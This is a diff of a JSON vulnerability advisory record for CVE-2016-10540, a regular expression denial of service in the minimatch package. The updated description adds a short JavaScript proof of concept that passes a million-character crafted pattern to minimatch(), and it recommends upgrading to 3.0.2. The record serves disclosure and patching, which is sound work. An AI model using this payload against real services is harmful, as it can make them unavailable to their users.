@@ -27,12 +27,12 @@
         "Value": "CVE-2016-10540"
       }
     ],
-    "Description": "Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects. The primary function, `minimatch(path, pattern)` in Minimatch 3.0.1 and earlier is vulnerable to ReDoS in the `pattern` parameter.",
+    "Description": "Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.\n\n\n## Proof of Concept\n```\nvar minimatch = require(“minimatch”);\n\n// utility function for generating long strings\nvar genstr = function (len, chr) {\n  var result = “”;\n  for (i=0; i\u003c=len; i++) {\n    result = result + chr;\n  }\n  return result;\n}\n\nvar exploit = “[!” + genstr(1000000, “\\\\”) + “A”;\n\n// minimatch exploit.\nconsole.log(“starting minimatch”);\nminimatch(“foo”, exploit);\nconsole.log(“finishing minimatch”);\n```\n\n\n## Recommendation\n\nUpdate to version 3.0.2 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-10-09T00:40:41Z",
     "Severity": "HIGH",
-    "Summary": "High severity vulnerability that affects minimatch",
-    "UpdatedAt": "2019-07-03T21:02:03Z",
+    "Summary": "Regular Expression Denial of Service in minimatch",
+    "UpdatedAt": "2020-08-31T18:11:26Z",
     "WithdrawnAt": ""
   },
   "Versions": [
